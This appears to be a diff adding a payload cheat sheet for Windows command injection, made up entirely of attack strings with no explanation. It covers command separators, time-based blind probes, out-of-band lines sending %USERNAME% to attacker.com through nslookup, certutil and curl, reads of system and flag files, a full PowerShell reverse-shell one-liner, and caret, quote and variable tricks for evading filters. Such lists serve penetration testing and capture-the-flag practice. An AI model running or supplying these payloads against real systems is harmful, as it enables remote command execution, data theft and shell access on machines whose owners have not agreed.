@@ -1,0 +1,54 @@
+# Windows Command Injection
+
+# ============ Basic separators ============
+& whoami
+| whoami
+&& whoami
+|| whoami
+%0awhoami
+
+# ============ With original command ============
+127.0.0.1 & whoami
+127.0.0.1 | whoami
+127.0.0.1 && whoami
+127.0.0.1 || whoami
+
+# ============ Blind (time-based) ============
+& ping -n 5 127.0.0.1
+| ping -n 5 127.0.0.1
+& timeout 5
+| timeout 5
+
+# ============ Blind (OOB) ============
+& nslookup attacker.com
+| nslookup %USERNAME%.attacker.com
+& certutil -urlcache -split -f http://attacker.com/?x=%USERNAME%
+| curl http://attacker.com/?x=%USERNAME%
+
+# ============ File read ============
+& type C:\Windows\win.ini
+| type C:\Users\Administrator\Desktop\flag.txt
+& more C:\Windows\System32\drivers\etc\hosts
+
+# ============ Reverse shell (PowerShell) ============
+& powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('IP',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
+
+# ============ Bypass techniques ============
+# Using caret (escape char)
+w^h^o^a^m^i
+c^m^d /c whoami
+p^o^w^e^r^s^h^e^l^l
+
+# Using quotes
+who""ami
+"whoami"
+w"h"o"a"m"i"
+
+# Using variables
+set a=who&& set b=ami&& %a%%b%
+
+# Comma as separator
+cmd,/c,whoami
+
+# Using FOR loop
+for /f %i in ('whoami') do echo %i
